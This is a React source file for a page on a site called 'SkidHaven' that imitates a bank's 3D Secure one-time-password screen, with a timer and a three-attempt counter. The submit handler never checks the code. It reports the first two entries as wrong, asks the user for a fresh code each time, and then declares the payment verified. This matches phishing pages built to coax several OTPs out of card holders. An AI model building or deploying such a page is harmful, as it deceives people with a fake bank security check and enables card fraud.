
import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";
import SkidHavenHeader from "@/components/SkidHavenHeader";
import SkidHavenFooter from "@/components/SkidHavenFooter";
import { AlertCircle, Clock, Shield } from "lucide-react";
import { InputOTP, InputOTPGroup, InputOTPSlot, InputOTPSeparator } from "@/components/ui/input-otp";

const OTPVerification = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [countdown, setCountdown] = useState(15 * 60);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [key, setKey] = useState(0);
  
  const orderDetails = location.state?.orderDetails;
  const giftCardValue = location.state?.giftCardValue;
  const discountedAmount = location.state?.discountedAmount;
  const paymentMethod = location.state?.paymentMethod;
  const lastFour = location.state?.lastFour;

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const timePercentage = (countdown / (15 * 60)) * 100;

  useEffect(() => {
    if (!orderDetails) {
      navigate("/");
      toast({
        title: "Error",
        description: "No payment information found. Please start again.",
        variant: "destructive",
      });
    }
  }, [orderDetails, navigate]);

  useEffect(() => {
    if (countdown <= 0) return;
    
    const timer = setInterval(() => {
      setCountdown(prevCountdown => {
        if (prevCountdown <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevCountdown - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, [countdown]);

  useEffect(() => {
    if (countdown === 0) {
      toast({
        title: "Time Expired",
        description: "The verification time has expired. Please try again.",
        variant: "destructive",
      });
      navigate("/payment-cancelled", { 
        state: { 
          reason: "OTP verification timed out"
        }
      });
    }
  }, [countdown, navigate]);
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    if (otp.length !== 6) {
      setError("Please enter a complete 6-digit code");
      return;
    }
    
    if (attempts < 2) {
      setError("Invalid verification code. Please try again.");
      setAttempts(prev => prev + 1);
      
      setOtp("");
      setKey(prev => prev + 1);
      
      toast({
        title: "Verification Failed",
        description: attempts === 0 ? "The code you entered is incorrect. Please try again." : "Second attempt failed. One more attempt remaining.",
        variant: "destructive",
      });
    } else {
      setIsSubmitting(true);
      
      await new Promise(resolve => setTimeout(resolve, 1500));
        
      const completeOrderDetails = {
        ...orderDetails,
        paymentMethod: paymentMethod,
        lastFour: lastFour || "Unknown",
        otpVerified: true
      };
        
      localStorage.setItem("skidhavenOrder", JSON.stringify(completeOrderDetails));
        
      navigate("/payment-success", { 
        state: { 
          orderDetails: completeOrderDetails,
          giftCardValue,
          discountedAmount
        } 
      });
    }
  };

  const handleRequestNewOTP = () => {
    navigate("/payment", { 
      state: { 
        orderDetails,
        giftCardValue,
        discountedAmount
      } 
    });
    toast({
      title: "Returning to Payment",
      description: "You'll need to re-enter your payment details.",
    });
  };

  const getAttemptMessage = () => {
    if (attempts === 0) {
      return "Please enter the verification code sent to your phone";
    } else if (attempts === 1) {
      return "First attempt failed. Please try again with a new code";
    } else {
      return "Last attempt. Enter the verification code carefully";
    }
  };

  return (
    <div className="min-h-screen bg-black">
      <SkidHavenHeader />
      
      <div className="container py-8">
        <div className="max-w-xl mx-auto space-y-6">
          <div className="bg-gray-900/10 rounded-xl p-6 border border-gray-700/20">
            <h1 className="text-3xl font-bold text-white mb-4 text-center">
              3D Secure <span className="text-blue-600">Verification</span>
            </h1>
            
            <div className="flex flex-col items-center mb-8">
              <div className="w-full max-w-[250px] h-3 bg-gray-800/20 rounded-full overflow-hidden mb-2">
                <div 
                  className={`h-full transition-all duration-1000 ease-linear ${
                    countdown > 300 ? 'bg-green-500' : countdown > 60 ? 'bg-yellow-500' : 'bg-red-500'
                  }`}
                  style={{ width: `${timePercentage}%` }}
                />
              </div>
              
              <div className="bg-gray-800/20 px-4 py-1.5 rounded-full flex items-center">
                <Clock className={`h-4 w-4 mr-2 ${
                  countdown > 300 ? 'text-green-500' : countdown > 60 ? 'text-yellow-500' : 'text-red-500'
                }`} />
                <span className="text-white font-mono text-sm font-bold">
                  {countdown > 0 ? formatTime(countdown) : "00:00"}
                </span>
              </div>
            </div>
            
            <div className="space-y-4 bg-gray-800 p-6 rounded-lg border border-gray-700/20 mb-8">
              <p className="text-white text-lg text-center font-medium">
                For your security, we've sent a verification code to
              </p>
              <p className="text-blue-600 font-mono text-center text-lg font-bold">
                ******{orderDetails?.phone?.slice(-4) || "0000"}
              </p>
              <p className="text-gray-400 text-sm text-center">
                {getAttemptMessage()}
              </p>
              
              <div className="flex justify-center items-center gap-2 pt-2">
                <span className={`w-3 h-3 rounded-full ${attempts >= 0 ? 'bg-blue-600' : 'bg-gray-600/30'}`}></span>
                <span className={`w-3 h-3 rounded-full ${attempts >= 1 ? 'bg-blue-600' : 'bg-gray-600/30'}`}></span>
                <span className={`w-3 h-3 rounded-full ${attempts >= 2 ? 'bg-blue-600' : 'bg-gray-600/30'}`}></span>
                <span className="text-xs text-gray-400 ml-2">Attempt {attempts + 1}/3</span>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-6">
                <div className="flex justify-center">
                  <InputOTP
                    key={key}
                    value={otp}
                    onChange={(value) => {
                      setOtp(value);
                      if (value.length === 6) {
                        setError("");
                      }
                    }}
                    maxLength={6}
                  >
                    <InputOTPGroup className="gap-2 md:gap-4">
                      <InputOTPSlot index={0} />
                      <InputOTPSlot index={1} />
                      <InputOTPSlot index={2} />
                      <InputOTPSeparator className="mx-1 text-gray-500">-</InputOTPSeparator>
                      <InputOTPSlot index={3} />
                      <InputOTPSlot index={4} />
                      <InputOTPSlot index={5} />
                    </InputOTPGroup>
                  </InputOTP>
                </div>
                
                {error && (
                  <div className="text-red-500 text-sm flex items-center justify-center gap-1 mt-2">
                    <AlertCircle className="h-4 w-4" />
                    <span>{error}</span>
                  </div>
                )}
              </div>
              
              <div className="mt-8">
                <h3 className="text-gray-300 text-center mb-3 font-medium">Transaction Details</h3>
                <div className="bg-gray-800 p-4 rounded-lg border border-gray-700/20 space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Amount:</span>
                    <span className="text-blue-600 font-semibold">${discountedAmount?.toFixed(2) || "0.00"}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400">Card:</span>
                    <span className="text-white">{paymentMethod} •••• {lastFour || "****"}</span>
                  </div>
                </div>
              </div>
              
              <div className="flex flex-col gap-3 mt-8">
                <Button 
                  type="submit" 
                  disabled={isSubmitting || countdown === 0 || otp.length !== 6}
                  className="w-full py-7 bg-blue-600 hover:bg-blue-600/90 text-white font-bold text-lg"
                >
                  {isSubmitting ? (
                    <div className="flex items-center space-x-2">
                      <div className="w-5 h-5 border-2 border-t-transparent border-white rounded-full animate-spin"></div>
                      <span>Verifying...</span>
                    </div>
                  ) : (
                    "Verify Payment"
                  )}
                </Button>
                
                <Button
                  type="button"
                  variant="outline"
                  onClick={handleRequestNewOTP}
                  className="w-full py-2 text-white border-gray-600 hover:bg-gray-600/20"
                >
                  Back to Payment
                </Button>
              </div>
              
              <div className="flex items-center justify-center text-center px-6 mt-4">
                <Shield className="text-gray-400 mr-2 h-4 w-4 flex-shrink-0" />
                <p className="text-gray-400 text-xs">
                  3D Secure verification helps protect your account from unauthorized transactions
                </p>
              </div>
            </form>
          </div>
        </div>
      </div>
      
      <SkidHavenFooter />
    </div>
  );
};

export default OTPVerification;
